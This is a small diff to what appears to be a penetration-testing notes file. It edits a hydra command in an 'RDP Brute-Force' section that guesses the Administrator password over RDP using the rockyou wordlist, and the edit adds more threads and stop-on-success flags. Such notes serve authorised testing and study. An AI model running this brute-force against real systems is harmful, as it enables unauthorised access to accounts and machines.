@@ -73,7 +73,7 @@ RDP Brute-Force
 
 Use hydra:
 
-hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<target ip>
+hydra -t 32 -vV -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<window ip>
 
 
 Or use the Python script below.
